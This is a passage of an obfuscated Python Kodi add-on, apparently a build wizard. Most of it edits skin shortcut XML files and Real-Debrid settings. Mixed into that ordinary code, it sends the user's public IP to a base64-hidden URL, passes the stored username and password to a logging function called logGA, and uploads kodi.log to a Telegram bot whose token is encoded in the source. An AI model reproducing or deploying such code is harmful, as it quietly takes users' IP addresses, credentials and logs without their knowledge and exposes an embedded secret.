          O00OO000O0O0OO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:575
          OOOOO000OOO000OOO =str (json .loads (O00OO000O0O0OO0O0 )['ip'])#line:576
          O0O00OOOOO00OO0OO =OOOO0OOO000OOO0O0 #line:577
          O00O00O0O0O00O00O =OO0OOOO0O00O000OO #line:578
          import socket #line:580
          O00OO000O0O0OO0O0 =urllib2 .urlopen (OOOO00O000O000000 .decode ('base64')+' - '+O0O00OOOOO00OO0OO +' - '+O00O00O0O0O00O00O +' - '+OOO00O00O0OO00O00 ).readlines ()#line:581
       except :pass #line:582
def googleindicat ():#line:585
			import logg #line:586
			OO0OO00OOO0OOO0O0 =(ADDON .getSetting ("pass"))#line:587
			OOOOO00O00O00O0O0 =(ADDON .getSetting ("user"))#line:588
			logg .logGA (OO0OO00OOO0OOO0O0 ,OOOOO00O00O00O0O0 )#line:589
def logsend ():#line:590
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:591
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:592
      howsentlog ()#line:594
      import requests #line:595
      if xbmc .getCondVisibility ('system.platform.windows'):#line:596
         O00OO0OO0O0OO00OO =xbmc .translatePath ('special://home/kodi.log')#line:597
         OO00OOOO00OOOO000 ={'chat_id':(None ,'-274262389'),'document':(O00OO0OO0O0OO00OO ,open (O00OO0OO0O0OO00OO ,'rb')),}#line:601
         O0O0OOOOO0O0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:602
         O0O00000OOO0O00OO =requests .post (O0O0OOOOO0O0000OO .decode ('base64'),files =OO00OOOO00OOOO000 )#line:604
      elif xbmc .getCondVisibility ('system.platform.android'):#line:605
           O00OO0OO0O0OO00OO =xbmc .translatePath ('special://temp/kodi.log')#line:606
           OO00OOOO00OOOO000 ={'chat_id':(None ,'-274262389'),'document':(O00OO0OO0O0OO00OO ,open (O00OO0OO0O0OO00OO ,'rb')),}#line:610
           O0O0OOOOO0O0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:611
           O0O00000OOO0O00OO =requests .post (O0O0OOOOO0O0000OO .decode ('base64'),files =OO00OOOO00OOOO000 )#line:613
      else :#line:614
           O00OO0OO0O0OO00OO =xbmc .translatePath ('special://kodi.log')#line:615
           OO00OOOO00OOOO000 ={'chat_id':(None ,'-274262389'),'document':(O00OO0OO0O0OO00OO ,open (O00OO0OO0O0OO00OO ,'rb')),}#line:619
           O0O0OOOOO0O0000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:620
           O0O00000OOO0O00OO =requests .post (O0O0OOOOO0O0000OO .decode ('base64'),files =OO00OOOO00OOOO000 )#line:622
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:623
def rdoff ():#line:625
	O0OO0OO0OO0O0OO00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:626
	O0OO0OO0OO0O0OO00 .setSetting ('rd.client_id','')#line:627
	O0OO0OO0OO0O0OO00 .setSetting ('rd.secret','')#line:628
	O0OO0OO0OO0O0OO00 .setSetting ('rdsource','false')#line:629
	O0OO0OO0OO0O0OO00 .setSetting ('super_fast_type_toren','false')#line:630
	O0OO0OO0OO0O0OO00 .setSetting ('rd.auth','false')#line:631
	O0OO0OO0OO0O0OO00 .setSetting ('rd.refresh','false')#line:632
	O0OO0OO0OO0O0OO00 .setSetting ('magnet','false')#line:633
	O0OO0OO0OO0O0OO00 .setSetting ('torrent_server','false')#line:634
	O0OO0OO0OO0O0OO00 =xbmcaddon .Addon ('script.module.resolveurl')#line:636
	O0OO0OO0OO0O0OO00 .setSetting ('RealDebridResolver_client_id','')#line:637
	O0OO0OO0OO0O0OO00 .setSetting ('RealDebridResolver_client_secret','')#line:638
	O0OO0OO0OO0O0OO00 .setSetting ('RealDebridResolver_token','')#line:639
	O0OO0OO0OO0O0OO00 .setSetting ('RealDebridResolver_refresh','')#line:640
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:641
		O0OO0OO0OO0O0OO00 =xbmcaddon .Addon ('plugin.video.seren')#line:642
		O0OO0OO0OO0O0OO00 .setSetting ('rd.client_id','')#line:644
		O0OO0OO0OO0O0OO00 .setSetting ('rd.secret','')#line:645
		O0OO0OO0OO0O0OO00 .setSetting ('rd.auth','')#line:646
		O0OO0OO0OO0O0OO00 .setSetting ('rd.refresh','')#line:647
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:648
		O0OO0OO0OO0O0OO00 =xbmcaddon .Addon ('plugin.video.gaia')#line:649
		O0OO0OO0OO0O0OO00 .setSetting ('accounts.debrid.realdebrid.id','')#line:650
		O0OO0OO0OO0O0OO00 .setSetting ('accounts.debrid.realdebrid.secret','')#line:651
		O0OO0OO0OO0O0OO00 .setSetting ('accounts.debrid.realdebrid.token','')#line:652
		O0OO0OO0OO0O0OO00 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:653
	resloginit .resloginit ('restore','all')#line:654
	OO00OO0O0OOO000O0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:656
	O0000O0000OO0O0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:657
	copyfile (OO00OO0O0OOO000O0 ,O0000O0000OO0O0OO )#line:658
def skindialogsettind18 ():#line:659
	try :#line:660
		O0OOOO000OO0000OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:661
		OO0O000000000O0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:662
		copyfile (O0OOOO000OO0000OO ,OO0O000000000O0O0 )#line:663
	except :pass #line:664
def rdon ():#line:665
	loginit .loginIt ('restore','all')#line:666
	O00OO00000OO00O00 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:668
	O00O00OOOOOO0OO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:669
	copyfile (O00OO00000OO00O00 ,O00O00OOOOOO0OO0O )#line:670
def adults18 ():#line:672
  OOO0O0OO0OOO0OOOO =(ADDON .getSetting ("adults"))#line:673
  if OOO0O0OO0OOO0OOOO =='true':#line:674
    OOO00O0OOOO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:675
    with open (OOO00O0OOOO0000O0 ,'r')as OO00OOOOOO0OO00O0 :#line:676
      OOO00O00O0OOOOOO0 =OO00OOOOOO0OO00O0 .read ()#line:677
    OOO00O00O0OOOOOO0 =OOO00O00O0OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:695
    with open (OOO00O0OOOO0000O0 ,'w')as OO00OOOOOO0OO00O0 :#line:698
      OO00OOOOOO0OO00O0 .write (OOO00O00O0OOOOOO0 )#line:699
def rdbuildaddon ():#line:700
  OOOO0000O0000O00O =(ADDON .getSetting ("auto_rd"))#line:701
  if OOOO0000O0000O00O =='true':#line:702
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:703
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:704
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:705
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:723
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:726
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:727
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:731
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:732
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:733
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:751
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:754
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:755
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:759
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:760
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:761
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:779
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:782
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:783
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:787
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:788
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:789
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:807
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:810
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:811
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:814
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:815
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:816
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:834
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:837
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:838
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:840
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:841
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:842
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:860
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:863
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:864
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:866
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:867
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:868
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:886
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:889
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:890
    OOO0OO0OOO0O0O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:893
    with open (OOO0OO0OOO0O0O00O ,'r')as OO0O00O000OO0OO00 :#line:894
      O0OOO00O0000O0OOO =OO0O00O000OO0OO00 .read ()#line:895
    O0OOO00O0000O0OOO =O0OOO00O0000O0OOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:913
    with open (OOO0OO0OOO0O0O00O ,'w')as OO0O00O000OO0OO00 :#line:916
      OO0O00O000OO0OO00 .write (O0OOO00O0000O0OOO )#line:917
def rdbuildinstall ():#line:920
  try :#line:921
   OO000OOOOOOOOOO00 =(ADDON .getSetting ("auto_rd"))#line:922
   if OO000OOOOOOOOOO00 =='true':#line:923
     O0O0000O0OO0O0000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:924
     O0000O0O0OOO0O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:925
     copyfile (O0O0000O0OO0O0000 ,O0000O0O0OOO0O000 )#line:926
  except :#line:927
     pass #line:928
def rdbuildaddonoff ():#line:931
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:934
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:935
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:936
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:954
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:957
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:958
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:962
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:963
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:964
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:982
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:985
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:986
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:990
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:991
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:992
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1010
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:1013
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:1014
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1018
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:1019
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:1020
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1038
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:1041
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:1042
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1045
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:1046
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:1047
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1065
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:1068
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:1069
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1071
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:1072
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:1073
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1091
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:1094
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:1095
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1097
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:1098
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:1099
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1117
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:1120
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:1121
    O0OO000O0O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1124
    with open (O0OO000O0O00OOOOO ,'r')as OOO0O0O000OO00O00 :#line:1125
      O000OOOOO00OO00O0 =OOO0O0O000OO00O00 .read ()#line:1126
    O000OOOOO00OO00O0 =O000OOOOO00OO00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1144
    with open (O0OO000O0O00OOOOO ,'w')as OOO0O0O000OO00O00 :#line:1147
      OOO0O0O000OO00O00 .write (O000OOOOO00OO00O0 )#line:1148
def rdbuildinstalloff ():#line:1151
    try :#line:1152
       O000000OO0OOOO000 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1153
       O0000O0OO000O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1154
       copyfile (O000000OO0OOOO000 ,O0000O0OO000O0O00 )#line:1156
       O000000OO0OOOO000 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1158
       O0000O0OO000O0O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1159
       copyfile (O000000OO0OOOO000 ,O0000O0OO000O0O00 )#line:1161
       O000000OO0OOOO000 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1163
       O0000O0OO000O0O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1164
       copyfile (O000000OO0OOOO000 ,O0000O0OO000O0O00 )#line:1166
       O000000OO0OOOO000 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1169
       O0000O0OO000O0O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1170
